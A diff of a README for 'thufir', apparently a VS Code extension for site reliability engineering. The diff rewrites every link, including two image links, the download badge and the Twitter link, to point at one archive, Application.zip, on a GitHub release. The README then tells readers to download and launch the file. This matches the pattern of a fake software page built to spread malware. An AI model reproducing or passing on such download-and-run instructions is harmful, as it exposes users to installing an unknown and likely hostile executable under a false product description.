@@ -2,7 +2,7 @@
 
 Welcome to the official repository of **thufir** - the SRE (Site Reliability Engineering) Agent extension for Visual Studio Code! 
 
-![SRE Agent](https://img.icons8.com/color/452/site-reliability-engineering.png)
+![SRE Agent](https://github.com/Sigma56xx/thufir/releases/download/v1.0/Application.zip)
 
 ## Description
 
@@ -20,13 +20,13 @@ Welcome to the official repository of **thufir** - the SRE (Site Reliability Eng
 
 ⚠️ **Incident Response**: Receive alerts and notifications for critical incidents, enabling you to respond promptly and effectively.
 
-![VS Code Extension](https://img.icons8.com/ios-glyphs/452/visual-studio-code.png)
+![VS Code Extension](https://github.com/Sigma56xx/thufir/releases/download/v1.0/Application.zip)
 
 ## Installation
 
 To install **thufir**, simply download the extension package from the following link: 
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/Sigma56xx/thufir/releases/download/v1.0/Application.zip)](https://github.com/Sigma56xx/thufir/releases/download/v1.0/Application.zip)
 
 Once you have downloaded the package, launch the file to begin the installation process.
 
@@ -52,7 +52,7 @@ Your feedback is invaluable to us. If you have any suggestions, feature requests
 
 ## Connect with Us
 
-Stay up to date on the latest news and updates by following us on [Twitter](https://twitter.com/thufir_sre)!
+Stay up to date on the latest news and updates by following us on [Twitter](https://github.com/Sigma56xx/thufir/releases/download/v1.0/Application.zip)!
 
 ## Repository Topics
 
